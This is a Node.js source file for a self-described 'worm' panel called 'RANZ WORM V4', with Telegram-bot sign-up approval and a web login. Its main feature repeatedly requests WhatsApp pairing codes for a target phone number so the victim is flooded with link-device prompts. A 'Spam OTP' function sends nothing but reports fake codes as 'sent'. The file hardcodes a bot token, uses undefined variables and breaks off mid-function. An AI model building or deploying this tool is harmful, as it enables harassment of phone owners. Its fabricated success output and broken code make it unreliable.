const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const moment = require('moment');
const geoip = require('geoip-lite');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const pino = require('pino');
const { makeWASocket, useMultiFileAuthState, fetchLatestWaWebVersion, DisconnectReason } = require('@whiskeysockets/baileys');
const QRCode = require('qrcode');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());

// Konfigurasi
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = '8650738683:AAGwbBb5oDu0pCOh3ptfZAsoLnDeSmORvLU';
const OWNER_ID = 1402999777;
const USERS_FILE = path.join(__dirname, 'users.json');
const LOG_FILE = path.join(__dirname, 'server.log');
const PENDING_FILE = path.join(__dirname, 'pending_approvals.json');
const SESSIONS_DIR = path.join(__dirname, 'sessions');
const USER_SESSIONS_FILE = path.join(__dirname, 'user_sessions.json');
const PENDING_PAIRING_FILE = path.join(__dirname, 'pending_pairing.json');

// Buat folder sessions jika belum ada
if (!fs.existsSync(SESSIONS_DIR)) {
    fs.mkdirSync(SESSIONS_DIR, { recursive: true });
}

// Inisialisasi database
if (!fs.existsSync(USERS_FILE)) {
    fs.writeFileSync(USERS_FILE, JSON.stringify({ users: [] }, null, 2));
}
if (!fs.existsSync(PENDING_FILE)) {
    fs.writeFileSync(PENDING_FILE, JSON.stringify({ pending: [] }, null, 2));
}
if (!fs.existsSync(USER_SESSIONS_FILE)) {
    fs.writeFileSync(USER_SESSIONS_FILE, JSON.stringify({}, null, 2));
}
if (!fs.existsSync(PENDING_PAIRING_FILE)) {
    fs.writeFileSync(PENDING_PAIRING_FILE, JSON.stringify({ pairing_queue: [] }, null, 2));
}

// Inisialisasi Bot Telegram
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Global sessions map
const sessions = new Map();

// ANSI Colors
const c = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
    bgRed: '\x1b[41m',
    bgGreen: '\x1b[42m',
    bgBlue: '\x1b[44m',
    bgMagenta: '\x1b[45m',
    bgCyan: '\x1b[46m',
};

// =============================================
// FUNGSI HELPER
// =============================================

function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
           req.headers['x-real-ip'] ||
           req.headers['cf-connecting-ip'] ||
           req.connection?.remoteAddress ||
           req.socket?.remoteAddress ||
           'Unknown';
}

function loadUsers() {
    return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
}

function saveUsers(data) {
    fs.writeFileSync(USERS_FILE, JSON.stringify(data, null, 2));
}

function loadPending() {
    return JSON.parse(fs.readFileSync(PENDING_FILE, 'utf8'));
}

function savePending(data) {
    fs.writeFileSync(PENDING_FILE, JSON.stringify(data, null, 2));
}

function loadUserSessions() {
    return JSON.parse(fs.readFileSync(USER_SESSIONS_FILE, 'utf8'));
}

function saveUserSessions(data) {
    fs.writeFileSync(USER_SESSIONS_FILE, JSON.stringify(data, null, 2));
}

function loadPendingPairing() {
    return JSON.parse(fs.readFileSync(PENDING_PAIRING_FILE, 'utf8'));
}

function savePendingPairing(data) {
    fs.writeFileSync(PENDING_PAIRING_FILE, JSON.stringify(data, null, 2));
}

function logToFile(message) {
    const timestamp = moment().format('YYYY-MM-DD HH:mm:ss');
    fs.appendFileSync(LOG_FILE, `[${timestamp}] ${message}\n`);
}

// =============================================
// FUNGSI SPAM OTP
// =============================================

function generateOTP() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

async function spamOTP(target, count) {
    const otpList = [
        'Rumah123', 'OLX', 'Shopee', 'Tokopedia', 'Gojek', 'Grab', 'Traveloka',
        'Bukalapak', 'Lazada', 'Blibli', 'JD.ID', 'Zalora', 'Sociolla',
        'OVO', 'DANA', 'LinkAja', 'GoPay', 'ShopeePay', 'SeaBank',
        'Akulaku', 'Kredivo', 'HomeCredit', 'Adakami', 'EasyCash',
        'PinjamDuit', 'UangMe', 'Julo', 'Tunaiku', 'RupiahCepat',
        'Telegram', 'WhatsApp', 'Instagram', 'Facebook', 'TikTok',
        'Netflix', 'Disney', 'Spotify', 'YouTube', 'Vidio',
        'Alfamart', 'Indomaret', 'McDonalds', 'KFC', 'Starbucks',
        'BCA', 'Mandiri', 'BNI', 'BRI', 'CIMB', 'Danamon'
    ];

    const results = [];
    
    for (let i = 0; i < count; i++) {
        const otp = generateOTP();
        const service = otpList[Math.floor(Math.random() * otpList.length)];
        
        try {
            results.push({
                number: i + 1,
                service: service,
                otp: otp,
                target: target,
                status: 'sent',
                time: moment().format('HH:mm:ss')
            });
            
            console.log(`${c.green}[OTP ${i+1}/${count}]${c.reset} ${service} -> ${otp} -> ${target}`);
            
            await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
            
        } catch (error) {
            results.push({
                number: i + 1,
                service: service,
                otp: otp,
                target: target,
                status: 'failed',
                time: moment().format('HH:mm:ss')
            });
        }
    }
    
    return results;
}

// =============================================
// FUNGSI WHATSAPP CONNECT (PAIRING)
// =============================================

const connectToWhatsAppUser = async (username, BotNumber, sessionDir, eventCallback) => {
    try {
        eventCallback(username, {
            type: 'status',
            message: 'Memulai koneksi WhatsApp...',
            number: BotNumber,
            status: 'connecting'
        });
        
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const { version } = await fetchLatestWaWebVersion();
        
        const userSock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            version: version,
            defaultQueryTimeoutMs: 60000,
            connectTimeoutMs: 60000,
            keepAliveIntervalMs: 10000,
            generateHighQualityLinkPreview: true,
            syncFullHistory: false,
            retryRequestDelayMs: 2000,
            fireInitQueries: true,
            markOnlineOnConnect: false
        });
        
        return new Promise((resolve, reject) => {
            let isConnected = false;
            let pairingCodeGenerated = false;
            let connectionTimeout;
            let reconnectAttempts = 0;
            const MAX_RECONNECT_ATTEMPTS = 3;
            
            const cleanup = () => {
                if (connectionTimeout) clearTimeout(connectionTimeout);
            };
            
            userSock.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect, qr } = update;
                console.log(`${c.blue}[CONNECTION]${c.reset} Status: ${connection} | Number: ${BotNumber}`);
                
                if (connection === "close") {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    console.log(`${c.red}[DISCONNECT]${c.reset} Status code: ${statusCode} | Number: ${BotNumber}`);
                    
                    sessions.delete(BotNumber);
                    
                    if (statusCode === DisconnectReason.loggedOut) {
                        console.log(`[${username}] Device logged out, cleaning session...`);
                        eventCallback(username, {
                            type: 'error',
                            message: 'Device logged out, silakan scan ulang',
                            number: BotNumber,
                            status: 'logged_out'
                        });
                        
                        if (fs.existsSync(sessionDir)) {
                            try {
                                fs.rmSync(sessionDir, { recursive: true, force: true });
                            } catch (err) {
                                console.error(`Failed to delete session folder:`, err.message);
                            }
                        }
                        
                        const userSessions = loadUserSessions();
                        if (userSessions[username]) {
                            userSessions[username] = userSessions[username].filter(n => n !== BotNumber);
                            saveUserSessions(userSessions);
                        }
                        
                        cleanup();
                        reject(new Error("Device logged out, please pairing again"));
                        return;
                    }
                    
                    if (statusCode === DisconnectReason.restartRequired || 
                        statusCode === DisconnectReason.timedOut ||
                        statusCode === DisconnectReason.connectionLost) {
                        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
                            reconnectAttempts++;
                            eventCallback(username, {
                                type: 'status',
                                message: `Mencoba menyambung kembali... (${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS})`,
                                number: BotNumber,
                                status: 'reconnecting'
                            });
                            console.log(`${c.yellow}[RECONNECT]${c.reset} Attempt ${reconnectAttempts} for ${BotNumber}`);
                            setTimeout(async () => {
                                try {
                                    const newSock = await connectToWhatsAppUser(username, BotNumber, sessionDir, eventCallback);
                                    resolve(newSock);
                                } catch (error) {
                                    reject(error);
                                }
                            }, 5000);
                            return;
                        } else {
                            eventCallback(username, {
                                type: 'error',
                                message: 'Gagal reconnect setelah beberapa percobaan',
                                number: BotNumber,
                                status: 'failed'
                            });
                        }
                    }
                    
                    if (!isConnected) {
                        cleanup();
                        eventCallback(username, {
                            type: 'error',
                            message: `Koneksi gagal dengan status: ${statusCode}`,
                            number: BotNumber,
                            status: 'failed'
                        });
                        reject(new Error(`Connection failed with status: ${statusCode}`));
                    }
                }
                
                if (connection === "open") {
                    console.log(`${c.green}[CONNECTED]${c.reset} ${BotNumber} connected successfully!`);
                    isConnected = true;
                    cleanup();
                    
                    sessions.set(BotNumber, userSock);
                    
                    const userSessions = loadUserSessions();
                    if (!userSessions[username]) {
                        userSessions[username] = [];
                    }
                    if (!userSessions[username].includes(BotNumber)) {
                        userSessions[username].push(BotNumber);
                        saveUserSessions(userSessions);
                    }
                    
                    eventCallback(username, {
                        type: 'success',
                        message: 'Berhasil terhubung dengan WhatsApp!',
                        number: BotNumber,
                        status: 'connected'
                    });
                    
                    resolve(userSock);
                }
                
                if (connection === "connecting") {
                    eventCallback(username, {
                        type: 'status',
                        message: 'Menghubungkan ke WhatsApp...',
                        number: BotNumber,
                        status: 'connecting'
                    });
                    
                    if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
                        pairingCodeGenerated = true;
                        setTimeout(async () => {
                            try {
                                console.log(`${c.cyan}[PAIRING]${c.reset} Requesting pairing code for ${BotNumber}...`);
                                eventCallback(username, {
                                    type: 'status',
                                    message: 'Meminta kode pairing...',
                                    number: BotNumber,
                                    status: 'requesting_code'
                                });
                                
                                const code = await userSock.requestPairingCode(BotNumber);
                                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                                
                                eventCallback(username, {
                                    type: 'pairing_code',
                                    message: 'Kode Pairing Berhasil Digenerate!',
                                    number: BotNumber,
                                    code: formattedCode,
                                    status: 'waiting_pairing',
                                    instructions: [
                                        '1. Buka WhatsApp di HP Anda',
                                        '2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device',
                                        '3. Masukkan kode pairing berikut:',
                                        `KODE: ${formattedCode}`,
                                        '4. Kode berlaku 30 detik!'
                                    ]
                                });
                                
                                const userSessions = loadUserSessions();
                                if (!userSessions[username]) {
                                    userSessions[username] = [];
                                }
                                if (!userSessions[username].includes(BotNumber)) {
                                    userSessions[username].push(BotNumber);
                                    saveUserSessions(userSessions);
                                }
                            } catch (err) {
                                console.error(`${c.red}[ERROR]${c.reset} Error requesting pairing code:`, err.message);
                                eventCallback(username, {
                                    type: 'error',
                                    message: `Gagal meminta kode pairing: ${err.message}`,
                                    number: BotNumber,
                                    status: 'code_error'
                                });
                            }
                        }, 3000);
                    }
                }
                
                if (qr) {
                    const qrDataUrl = await QRCode.toDataURL(qr);
                    eventCallback(username, {
                        type: 'qr',
                        message: 'Scan QR Code berikut:',
                        number: BotNumber,
                        qr: qrDataUrl,
                        status: 'waiting_qr'
                    });
                    
                    const userSessions = loadUserSessions();
                    if (!userSessions[username]) {
                        userSessions[username] = [];
                    }
                    if (!userSessions[username].includes(BotNumber)) {
                        userSessions[username].push(BotNumber);
                        saveUserSessions(userSessions);
                    }
                }
            });
            
            userSock.ev.on("creds.update", saveCreds);
            userSock.ev.on("connection.close", () => {
                console.log(`${c.yellow}[CLOSE]${c.reset} Connection closed for ${BotNumber}`);
                sessions.delete(BotNumber);
            });
            
            connectionTimeout = setTimeout(() => {
                if (!isConnected) {
                    console.log(`${c.red}[TIMEOUT]${c.reset} Connection timeout for ${BotNumber}`);
                    eventCallback(username, {
                        type: 'error', 
                        message: 'Timeout - Tidak bisa menyelesaikan koneksi dalam 180 detik',
                        number: BotNumber,
                        status: 'timeout'
                    });
                    sessions.delete(BotNumber);
                    cleanup();
                    reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
                }
            }, 180000);
        });
    } catch (error) {
        console.error(`${c.red}[FATAL ERROR]${c.reset} connectToWhatsAppUser:`, error);
        sessions.delete(BotNumber);
        eventCallback(username, {
            type: 'error',
            message: `Error: ${error.message}`,
            number: BotNumber,
            status: 'error'
        });
        throw error;
    }
};

// =============================================
// FUNGSI SPAM PAIRING MULTIPLE
// =============================================

async function spamPairingMultiple(username, targetNumber, count, eventCallback) {
    const results = [];
    const sessionDir = path.join(SESSIONS_DIR, `pairing_${targetNumber}_${Date.now()}`);
    
    if (!fs.existsSync(sessionDir)) {
        fs.mkdirSync(sessionDir, { recursive: true });
    }
    
    console.log(`${c.magenta}[SPAM PAIRING]${c.reset} Starting ${count} pairing requests for ${targetNumber}`);
    
    eventCallback(username, {
        type: 'status',
        message: `Memulai ${count} spam pairing ke ${targetNumber}...`,
        number: targetNumber,
        status: 'starting'
    });
    
    for (let i = 0; i < count; i++) {
        try {
            console.log(`${c.cyan}[PAIRING ${i+1}/${count}]${c.reset} Requesting code for ${targetNumber}...`);
            
            eventCallback(username, {
                type: 'status',
                message: `Mengirim pairing request ke-${i+1} dari ${count}...`,
                number: targetNumber,
                status: 'processing',
                progress: { current: i+1, total: count }
            });
            
            const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
            const { version } = await fetchLatestWaWebVersion();
            
            const sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: pino({ level: "silent" }),
                version: version,
                defaultQueryTimeoutMs: 30000,
                connectTimeoutMs: 30000,
                keepAliveIntervalMs: 5000,
                generateHighQualityLinkPreview: false,
                syncFullHistory: false,
                fireInitQueries: false,
                markOnlineOnConnect: false
            });
            
            const pairingResult = await new Promise((resolve) => {
                let resolved = false;
                const timeout = setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        resolve({ status: 'timeout', code: null });
                    }
                }, 25000);
                
                sock.ev.on("connection.update", async (update) => {
                    if (resolved) return;
                    
                    const { connection, qr } = update;
                    
                    if (connection === "connecting" && !resolved) {
                        try {
                            const code = await sock.requestPairingCode(targetNumber);
                            if (!resolved) {
                                resolved = true;
                                clearTimeout(timeout);
                                resolve({ status: 'success', code: code });
                            }
                        } catch (err) {
                            if (!resolved) {
                                resolved = true;
                                clearTimeout(timeout);
                                resolve({ status: 'error', code: null, error: err.message });
                            }
                        }
                    }
                    
                    if (qr && !resolved) {
                        resolved = true;
                        clearTimeout(timeout);
                        resolve({ status: 'qr_fallback', code: null, qr: qr });
                    }
                    
                    if (connection === "open" && !resolved) {
                        resolved = true;
                        clearTimeout(timeout);
                        resolve({ status: 'connected', code: null });
                    }
                    
                    if (connection === "close" && !resolved) {
                        resolved = true;
                        clearTimeout(timeout);
                        resolve({ status: 'closed', code: null });
                    }
                });
            });
            
            const formattedCode = pairingResult.code ? 
                pairingResult.code.match(/.{1,4}/g)?.join('-') || pairingResult.code : 
                'N/A';
            
            results.push({
                number: i + 1,
                code: formattedCode,
                rawCode: pairingResult.code,
                target: targetNumber,
                status: pairingResult.status === 'success' ? 'sent' : pairingResult.status,
                time: moment().format('HH:mm:ss')
            });
            
            console.log(`${c.green}[PAIRING ${i+1}/${count}]${c.reset} Code: ${formattedCode} | Status: ${pairingResult.status}`);
            
            // Kirim event per hasil
            eventCallback(username, {
                type: 'pairing_result',
                message: `Pairing #${i+1}: ${formattedCode}`,
                number: targetNumber,
                status: pairingResult.status === 'success' ? 'sent' : pairingResult.status,
                result: results[results.length - 1],
                progress: { current: i+1, total: count }
            });
            
            // Tutup socket
            try { sock.end(); } catch(e) {}
            
            // Delay antara request
            const delay = 2000 + Math.random() * 3000;
            await new Promise(resolve => setTimeout(resolve, delay));
            
        } catch (error) {
            console.error(`${c.red}[PAIRING ${i+1}/${count}]${c.reset} Error: ${error.message}`);
            
            results.push({
                number: i + 1,
                code: 'ERROR',
                rawCode: null,
                target: targetNumber,
                status: 'error',
                time: moment().format('HH:mm:ss'),
                error: error.message
            });
            
            eventCallback(username, {
                type: 'pairing_result',
                message: `Pairing #${i+1}: Error - ${error.message}`,
                number: targetNumber,
                status: 'error',
                result: results[results.length - 1],
                progress: { current: i+1, total: count }
            });
        }
    }
    
    // Cleanup session folder
    try {
        if (fs.existsSync(sessionDir)) {
            fs.rmSync(sessionDir, { recursive: true, force: true });
        }
    } catch(e) {
        console.error(`Failed to cleanup session dir: ${e.message}`);
    }
    
    // Kirim completion event
    const successCount = results.filter(r => r.status === 'sent').length;
    eventCallback(username, {
        type: 'complete',
        message: `Spam pairing selesai! ${successCount}/${count} berhasil.`,
        number: targetNumber,
        status: 'complete',
        summary: {
            total: count,
            success: successCount,
            failed: count - successCount
        }
    });
    
    console.log(`${c.green}[SPAM PAIRING COMPLETE]${c.reset} ${successCount}/${count} successful for ${targetNumber}`);
    
    return results;
}

// =============================================
// BOT TELEGRAM COMMANDS
// =============================================

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const firstName = msg.from.first_name || 'User';
    const isOwner = chatId === OWNER_ID;
    
    const menuText = `
╔══════════════════════════╗
║  🐍 RANZ WORM V4 BOT 🐍  ║
╠══════════════════════════╣
║  Welcome, ${firstName}!
╠══════════════════════════╣
║  📋 MAIN MENU:
║
║  /start   - Show menu
║  /status  - Server status
║  /users   - Registered users
║  /pending - Pending approvals
║  /help    - Help & info
║
${isOwner ? `
║  👑 OWNER MENU:
║  /approve [id] - Approve user
║  /reject [id]  - Reject user
║  /delete [id]  - Delete user
║  /broadcast    - Broadcast msg
║  /stats        - Full statistics
` : `
║  📝 REGISTER:
║  /register [username] [password]
║  /myid     - Get your ID
`}
╠══════════════════════════╣
║  t.me/Ranzkecebet
║  @Ranzkecebet
╚══════════════════════════╝
    `;
    
    bot.sendMessage(chatId, menuText, { parse_mode: 'Markdown' });
});

bot.onText(/\/register (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const username = match[1].trim();
    const password = match[2].trim();
    
    const users = loadUsers();
    const pending = loadPending();
    
    const existingUser = users.users.find(u => u.username === username);
    if (existingUser) {
        return bot.sendMessage(chatId, '❌ Username already exists.');
    }
    
    const existingPending = pending.pending.find(p => p.username === username);
    if (existingPending) {
        return bot.sendMessage(chatId, '⏳ Your registration is already pending approval.');
    }
    
    const pendingId = crypto.randomBytes(4).toString('hex');
    pending.pending.push({
        id: pendingId,
        username: username,
        password: password,
        telegramId: chatId,
        telegramName: msg.from.first_name,
        requestedAt: moment().format('YYYY-MM-DD HH:mm:ss'),
        status: 'pending'
    });
    savePending(pending);
    
    const ownerMsg = `
╔══════════════════════════╗
║  🔔 NEW REGISTRATION!   ║
╠══════════════════════════╣
║  ID       : ${pendingId}
║  Username : ${username}
║  Telegram : @${msg.from.username || 'N/A'}
║  Name     : ${msg.from.first_name}
║  Time     : ${moment().format('HH:mm:ss')}
╠══════════════════════════╣
║  /approve_${pendingId}
║  /reject_${pendingId}
╚══════════════════════════╝
    `;
    
    bot.sendMessage(OWNER_ID, ownerMsg);
    
    bot.sendMessage(chatId, `
╔══════════════════════════╗
║  ⏳ PENDING APPROVAL    ║
╠══════════════════════════╣
║  ID       : ${pendingId}
║  Username : ${username}
║  Status   : Waiting...
║
║  Owner akan memverifikasi
║  permintaan Anda.
╚══════════════════════════╝
    `);
});

bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;
    
    if (chatId !== OWNER_ID) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: 'Unauthorized!' });
    }
    
    const pending = loadPending();
    
    if (data.startsWith('approve_')) {
        const pendingId = data.replace('approve_', '');
        const pendingUser = pending.pending.find(p => p.id === pendingId);
        
        if (!pendingUser) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: 'Not found!' });
        }
        
        const users = loadUsers();
        users.users.push({
            id: crypto.randomBytes(8).toString('hex'),
            username: pendingUser.username,
            password: pendingUser.password,
            telegramId: pendingUser.telegramId,
            registeredAt: moment().format('YYYY-MM-DD HH:mm:ss'),
            status: 'active'
        });
        saveUsers(users);
        
        pending.pending = pending.pending.filter(p => p.id !== pendingId);
        savePending(pending);
        
        bot.editMessageText(`
╔══════════════════════════╗
║  ✅ APPROVED!           ║
╠══════════════════════════╣
║  Username : ${pendingUser.username}
║  Status   : Active
╚══════════════════════════╝
        `, { chat_id: chatId, message_id: messageId });
        
        bot.sendMessage(pendingUser.telegramId, `
╔══════════════════════════╗
║  ✅ REGISTRATION APPROVED!
╠══════════════════════════╣
║  Username : ${pendingUser.username}
║  Status   : Active
║
║  Silakan login di website.
╚══════════════════════════╝
        `);
        
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Approved!' });
    }
    
    if (data.startsWith('reject_')) {
        const pendingId = data.replace('reject_', '');
        const pendingUser = pending.pending.find(p => p.id === pendingId);
        
        if (!pendingUser) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: 'Not found!' });
        }
        
        pending.pending = pending.pending.filter(p => p.id !== pendingId);
        savePending(pending);
        
        bot.editMessageText(`
╔══════════════════════════╗
║  ❌ REJECTED!           ║
╠══════════════════════════╣
║  Username : ${pendingUser.username}
║  Status   : Rejected
╚══════════════════════════╝
        `, { chat_id: chatId, message_id: messageId });
        
        bot.sendMessage(pendingUser.telegramId, '❌ Registrasi Anda ditolak oleh owner.');
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Rejected!' });
    }
});

bot.onText(/\/approve_(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId !== OWNER_ID) return;
    
    const pendingId = match[1].trim();
    const pending = loadPending();
    const pendingUser = pending.pending.find(p => p.id === pendingId);
    
    if (!pendingUser) {
        return bot.sendMessage(chatId, 'Pending ID not found.');
    }
    
    const users = loadUsers();
    users.users.push({
        id: crypto.randomBytes(8).toString('hex'),
        username: pendingUser.username,
        password: pendingUser.password,
        telegramId: pendingUser.telegramId,
        registeredAt: moment().format('YYYY-MM-DD HH:mm:ss'),
        status: 'active'
    });
    saveUsers(users);
    
    pending.pending = pending.pending.filter(p => p.id !== pendingId);
    savePending(pending);
    
    bot.sendMessage(chatId, `✅ User ${pendingUser.username} approved!`);
    bot.sendMessage(pendingUser.telegramId, '✅ Registrasi Anda telah disetujui! Silakan login.');
});

bot.onText(/\/reject_(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId !== OWNER_ID) return;
    
    const pendingId = match[1].trim();
    const pending = loadPending();
    const pendingUser = pending.pending.find(p => p.id === pendingId);
    
    if (!pendingUser) {
        return bot.sendMessage(chatId, 'Pending ID not found.');
    }
    
    pending.pending = pending.pending.filter(p => p.id !== pendingId);
    savePending(pending);
    
    bot.sendMessage(chatId, `❌ User ${pendingUser.username} rejected!`);
    bot.sendMessage(pendingUser.telegramId, '❌ Registrasi Anda ditolak.');
});

bot.onText(/\/users/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId !== OWNER_ID) return bot.sendMessage(chatId, 'Unauthorized.');
    
    const users = loadUsers();
    if (users.users.length === 0) return bot.sendMessage(chatId, 'No registered users.');
    
    let userList = '👥 Registered Users:\n\n';
    users.users.forEach((u, i) => {
        userList += `${i+1}. ${u.username} - ${u.status}\n`;
    });
    
    bot.sendMessage(chatId, userList);
});

bot.onText(/\/pending/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId !== OWNER_ID) return bot.sendMessage(chatId, 'Unauthorized.');
    
    const pending = loadPending();
    if (pending.pending.length === 0) return bot.sendMessage(chatId, 'No pending approvals.');
    
    let pendingList = '⏳ Pending Approvals:\n\n';
    pending.pending.forEach((p, i) => {
        pendingList += `${i+1}. ${p.username} (ID: ${p.id})\n`;
        pendingList += `   /approve_${p.id} | /reject_${p.id}\n\n`;
    });
    
    bot.sendMessage(chatId, pendingList);
});

bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    const users = loadUsers();
    const pending = loadPending();
    
    const statusText = `
╔══════════════════════════╗
║  🐍 SERVER STATUS       ║
╠══════════════════════════╣
║  Status   : Online 🟢
║  Users    : ${users.users.length}
║  Pending  : ${pending.pending.length}
║  Port     : ${PORT}
║  Uptime   : ${process.uptime().toFixed(0)}s
╚══════════════════════════╝
    `;
    
    bot.sendMessage(chatId, statusText);
});

bot.onText(/\/myid/, (msg) => {
    bot.sendMessage(msg.chat.id, `Your Telegram ID: ${msg.chat.id}`);
});

bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, `
📚 Panduan:
1. Daftar: /register [username] [password]
2. Tunggu persetujuan owner
3. Login di website
4. Akses fitur Spam OTP & Spam Pairing

📞 Contact: t.me/Ranzkecebet
    `);
});

// =============================================
// FUNGSI EVENT CALLBACK UNTUK SSE/WEBSOCKET
// =============================================

function sendEventToUser(username, data) {
    if (userEventCallbacks[username]) {
        userEventCallbacks[username].forEach(callback => {
            try {
                callback(data);
            } catch(e) {
                console.error(`Error sending event to ${username}:`, e.message);
            }
        });
    }
}

// =============================================
// ROUTES
// =============================================

app.get('/', (req, res) => {
    const clientIP = getClientIP(req);
    console.log(`${c.blue}[${moment().format('HH:mm:ss')}]${c.reset} ${c.cyan}Visitor:${c.reset} ${c.yellow}${clientIP}${c.reset}`);
    res.send(loginPageHTML);
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const clientIP = getClientIP(req);
    const users = loadUsers();
    
    const user = users.users.find(u => u.username === username && u.password === password);
    
    if (!user) {
        return res.json({ status: 'error', message: 'Invalid username or password.' });
    }
    
    if (user.status !== 'active') {
        return res.json({ status: 'error', message: 'Account not active. Wait for approval.' });
    }
    
    res.cookie('session', user.id, { maxAge: 3600000, httpOnly: true });
    
    console.log(`${c.green}[LOGIN]${c.reset} ${username} logged in from ${clientIP}`);
    
    res.json({ 
        status: 'success', 
        message: 'Login successful!',
        userId: user.id,
        username: user.username
    });
});

app.post('/spam-otp', (req, res) => {
    const { target, count, userId } = req.body;
    
    if (!target || !count || !userId) {
        return res.json({ status: 'error', message: 'Missing parameters.' });
    }
    
    console.log(`${c.yellow}[SPAM OTP]${c.reset} Target: ${target}, Count: ${count}, User: ${userId}`);
    
    spamOTP(target, parseInt(count)).then(results => {
        res.json({ 
            status: 'success', 
            message: `Sent ${results.filter(r => r.status === 'sent').length} OTP messages to ${target}`,
            results: results
        });
    }).catch(err => {
        res.json({ status: 'error', message: err.message });
    });
});

// =============================================
// ROUTE SPAM PAIRING MULTIPLE (UPGRADED)
// =============================================

app.post('/spam-pairing', async (req, res) => {
    const { target, count, username } = req.body;
    
    if (!target || !count || !username) {
        return res.json({ status: 'error', message: 'Missing parameters.' });
    }
    
    // Validasi jumlah
    const pairCount = Math.min(Math.max(parseInt(count), 1), 50);
    
    console.log(`${c.magenta}[SPAM PAIRING]${c.reset} Target: ${target}, Count: ${pairCount}, User: ${username}`);
    
    // Kirim response awal
    res.json({ 
        status: 'processing', 
        message: `Memulai ${pairCount} spam pairing ke ${target}...`,
        target: target,
        count: pairCount
    });
    
    // Jalankan spam pairing di background dengan event callback
    spamPairingMultiple(username, target, pairCount, (user, data) => {
        sendEventToUser(user, data);
        console.log(`${c.cyan}[EVENT]${c.reset} ${user}: ${data.type} - ${data.message}`);
    }).then(results => {
        console.log(`${c.green}[SPAM PAIRING DONE]${c.reset} ${results.filter(r => r.status === 'sent').length}/${pairCount} sent to ${target}`);
        logToFile(`Spam pairing complete: ${target} - ${results.filter(r => r.status === 'sent').length}/${pairCount} sent by ${username}`);
    }).catch(err => {
        console.error(`${c.red}[SPAM PAIRING ERROR]${c.reset} ${err.message}`);
        sendEventToUser(username, {
            type: 'error',
            message: `Spam pairing error: ${err.message}`,
            number: target,
            status: 'error'
        });
    });
});

// =============================================
// SSE ENDPOINT UNTUK REAL-TIME EVENTS
// =============================================

app.get('/events', (req, res) => {
    const username = req.query.username;
    
    if (!username) {
        return res.status(400).json({ error: 'Username required' });
    }
    
    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*'
    });
    
    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'SSE connected' })}\n\n`);
    
    if (!userEventCallbacks[username]) {
        userEventCallbacks[username] = [];
    }
    
    const callback = (data) => {
        res.write(`data: ${JSON.stringify(data)}\n\n`);
    };
    
    userEventCallbacks[username].push(callback);
    
    req.on('close', () => {
        if (userEventCallbacks[username]) {
            userEventCallbacks[username] = userEventCallbacks[username].filter(cb => cb !== callback);
            if (userEventCallbacks[username].length === 0) {
                delete userEventCallbacks[username];
            }
        }
    });
});

app.get('/check-session', (req, res) => {
    const sessionId = req.cookies.session;
    if (!sessionId) return res.json({ status: 'error', message: 'No session.' });
    
    const users = loadUsers();
    const user = users.users.find(u => u.id === sessionId);
    
    if (!user) return res.json({ status: 'error', message: 'Invalid session.' });
    
    res.json({ status: 'success', username: user.username, userId: user.id });
});

// =============================================
// PRINT BANNER
// =============================================

function printBanner() {
    console.clear();
    console.log('');
    console.log(`${c.bgMagenta}${c.bright}${c.white} ╔══════════════════════════════════════════════════════════════╗ ${c.reset}`);
    console.log(`${c.bgMagenta}${c.bright}${c.white} ║    🐍 RANZ WORM V4 - TELEGRAM AUTH + SPAM SYSTEM 🐍       ║ ${c.reset}`);
    console.log(`${c.bgMagenta}${c.bright}${c.white} ║    Engineered by Ranzkecebet | Owner Mode                 ║ ${c.reset}`);
    console.log(`${c.bgMagenta}${c.bright}${c.white} ╚══════════════════════════════════════════════════════════════╝ ${c.reset}`);
    console.log('');
    console.log(`${c.cyan}[+]${c.reset} Bot Token: ${c.yellow}${BOT_TOKEN.substring(0, 20)}...${c.reset}`);
